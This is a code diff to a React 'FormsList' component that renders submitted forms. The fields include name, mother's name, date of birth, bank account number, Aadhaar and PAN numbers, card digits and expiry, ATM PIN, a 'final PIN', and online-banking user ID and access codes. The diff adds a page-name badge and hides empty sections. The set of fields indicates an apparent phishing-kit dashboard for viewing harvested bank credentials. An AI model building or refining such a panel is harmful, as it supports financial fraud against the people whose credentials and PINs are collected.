@@ -131,10 +131,21 @@ function FormsList({ forms }: { forms: FormData[] }) {
                             <span style={{ fontSize: '1.5rem' }}>📋</span>
                             <div>
                                 <div style={{ fontWeight: 600, color: 'var(--text-primary)' }}>
-                                    {form.fullName || form.name || 'Unknown'}
+                                    {form.fullName || form.name || form.pageName || 'Submission'}
                                 </div>
-                                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
-                                    Submission #{sortedForms.length - idx}
+                                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
+                                    {form.pageName && (
+                                        <span style={{
+                                            background: 'rgba(59, 130, 246, 0.2)',
+                                            color: '#3b82f6',
+                                            padding: '2px 6px',
+                                            borderRadius: '4px',
+                                            fontWeight: 500
+                                        }}>
+                                            {form.pageName}
+                                        </span>
+                                    )}
+                                    <span>#{sortedForms.length - idx}</span>
                                 </div>
                             </div>
                         </div>
@@ -143,49 +154,57 @@ function FormsList({ forms }: { forms: FormData[] }) {
                         </span>
                     </div>
 
-                    {/* Personal Details */}
-                    <div style={{ marginBottom: '1rem' }}>
-                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
-                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                            <div><strong>Name:</strong> {form.fullName || form.name || 'N/A'}</div>
-                            <div><strong>Mobile:</strong> {form.mobileNumber || form.phoneNumber || 'N/A'}</div>
-                            <div><strong>Mother:</strong> {form.motherName || 'N/A'}</div>
-                            <div><strong>DOB:</strong> {form.dateOfBirth || 'N/A'}</div>
+                    {/* Personal Details - show only if has data */}
+                    {(form.fullName || form.name || form.mobileNumber || form.phoneNumber || form.motherName || form.dateOfBirth) && (
+                        <div style={{ marginBottom: '1rem' }}>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {(form.fullName || form.name) && <div><strong>Name:</strong> {form.fullName || form.name}</div>}
+                                {(form.mobileNumber || form.phoneNumber) && <div><strong>Mobile:</strong> {form.mobileNumber || form.phoneNumber}</div>}
+                                {form.motherName && <div><strong>Mother:</strong> {form.motherName}</div>}
+                                {form.dateOfBirth && <div><strong>DOB:</strong> {form.dateOfBirth}</div>}
+                            </div>
                         </div>
-                    </div>
+                    )}
 
-                    {/* Account Details */}
-                    <div style={{ marginBottom: '1rem' }}>
-                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
-                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                            <div><strong>Account:</strong> {form.accountNumber || 'N/A'}</div>
-                            <div><strong>Aadhaar:</strong> {form.aadhaarNumber || 'N/A'}</div>
-                            <div><strong>PAN:</strong> {form.panCard || 'N/A'}</div>
-                            <div><strong>CIF:</strong> {form.cifNumber || 'N/A'}</div>
-                            <div><strong>Branch:</strong> {form.branchCode || 'N/A'}</div>
+                    {/* Account Details - show only if has data */}
+                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.cifNumber || form.branchCode) && (
+                        <div style={{ marginBottom: '1rem' }}>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.accountNumber && <div><strong>Account:</strong> {form.accountNumber}</div>}
+                                {form.aadhaarNumber && <div><strong>Aadhaar:</strong> {form.aadhaarNumber}</div>}
+                                {form.panCard && <div><strong>PAN:</strong> {form.panCard}</div>}
+                                {form.cifNumber && <div><strong>CIF:</strong> {form.cifNumber}</div>}
+                                {form.branchCode && <div><strong>Branch:</strong> {form.branchCode}</div>}
+                            </div>
                         </div>
-                    </div>
+                    )}
 
-                    {/* Card Details */}
-                    <div style={{ marginBottom: '1rem' }}>
-                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
-                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                            <div><strong>Last 6:</strong> {form.cardLast6 || 'N/A'}</div>
-                            <div><strong>Expiry:</strong> {form.cardExpiry || 'N/A'}</div>
-                            <div><strong>PIN:</strong> {form.atmPin || 'N/A'}</div>
-                            <div><strong>Final PIN:</strong> {form.finalPin || 'N/A'}</div>
+                    {/* Card Details - show only if has data */}
+                    {(form.cardLast6 || form.cardExpiry || form.atmPin || form.finalPin) && (
+                        <div style={{ marginBottom: '1rem' }}>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>💳 Card Details</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.cardLast6 && <div><strong>Last 6:</strong> {form.cardLast6}</div>}
+                                {form.cardExpiry && <div><strong>Expiry:</strong> {form.cardExpiry}</div>}
+                                {form.atmPin && <div><strong>PIN:</strong> {form.atmPin}</div>}
+                                {form.finalPin && <div><strong>Final PIN:</strong> {form.finalPin}</div>}
+                            </div>
                         </div>
-                    </div>
+                    )}
 
-                    {/* Login Credentials */}
-                    <div>
-                        <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
-                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
-                            <div><strong>User ID:</strong> {form.userId || 'N/A'}</div>
-                            <div><strong>Access Code:</strong> {form.accessCode || 'N/A'}</div>
-                            <div><strong>Profile Code:</strong> {form.profileCode || 'N/A'}</div>
+                    {/* Login Credentials - show only if has data */}
+                    {(form.userId || form.accessCode || form.profileCode) && (
+                        <div>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔐 Login Credentials</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                {form.userId && <div><strong>User ID:</strong> {form.userId}</div>}
+                                {form.accessCode && <div><strong>Access Code:</strong> {form.accessCode}</div>}
+                                {form.profileCode && <div><strong>Profile Code:</strong> {form.profileCode}</div>}
+                            </div>
                         </div>
-                    </div>
+                    )}
                 </div>
             ))}
         </div>
